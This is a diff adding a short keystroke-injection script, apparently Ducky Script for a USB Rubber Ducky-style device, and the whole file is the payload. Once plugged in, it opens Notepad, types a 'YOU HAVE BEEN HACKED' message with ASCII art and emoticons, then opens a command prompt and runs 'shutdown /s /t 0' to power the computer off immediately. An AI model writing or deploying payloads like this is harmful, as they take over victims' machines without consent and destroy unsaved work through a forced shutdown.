@@ -1,0 +1,23 @@
+DEFAULT_DELAY 100
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+STRING             _______
+ENTER
+STRING      ==[=========]>
+ENTER
+STRING             ‾‾‾‾‾‾‾
+ENTER
+ENTER
+STRING  YOU ( ≖‿ ≖ ) HAVE (づ｡ ◕‿‿◕｡)づ BEEN (⺣◡⺣)♡* HACKED ( ︶︿︶)_╭∩╮༘⋆♡⸝⸝⊹。°˖➴LOVE!!!! /ᐠ. ｡.ᐟ\ᵐᵉᵒʷˎˊ˗
+ENTER
+DELAY 400
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING shutdown /s /t 0
+ENTER
